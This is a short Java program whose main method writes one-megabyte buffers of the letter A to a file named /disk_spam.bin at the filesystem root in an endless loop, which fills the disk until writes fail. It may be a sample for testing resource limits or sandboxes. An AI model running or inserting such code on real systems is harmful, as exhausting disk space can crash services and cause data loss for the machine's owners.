import java.io.FileOutputStream;
import java.util.Arrays;

public class Main {
    public static void main(String[] args) throws Exception {
        byte[] buf = new byte[1024 * 1024];
        Arrays.fill(buf, (byte) 'A');
        try (FileOutputStream fos = new FileOutputStream("/disk_spam.bin")) {
            while (true) {
                fos.write(buf);
                fos.flush();
            }
        }
    }
}
